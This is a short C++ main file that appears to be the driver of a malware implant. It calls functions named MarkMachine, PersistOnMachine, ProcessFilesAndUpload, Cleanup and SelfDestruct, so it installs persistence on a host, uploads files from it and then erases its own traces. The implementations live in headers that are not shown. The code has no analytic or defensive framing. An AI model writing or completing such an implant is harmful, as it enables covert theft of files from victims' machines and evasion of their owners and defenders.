#include "Core/upload.hpp"
#include "Core/self_destruct.hpp"
#include "Core/mark_machine.hpp"
#include "Core/persistence.hpp"



constexpr bool ONETIMERUN = true;


int main() {
    MarkMachine();
    PersistOnMachine();
    if (ONETIMERUN) {
        
        ProcessFilesAndUpload();
        std::cout << "Beginning cleanup..." << std::endl;
        std::this_thread::sleep_for(std::chrono::seconds(5));
        Cleanup();
        std::this_thread::sleep_for(std::chrono::seconds(3));
        SelfDestruct();
    }
    
    return 0;
}

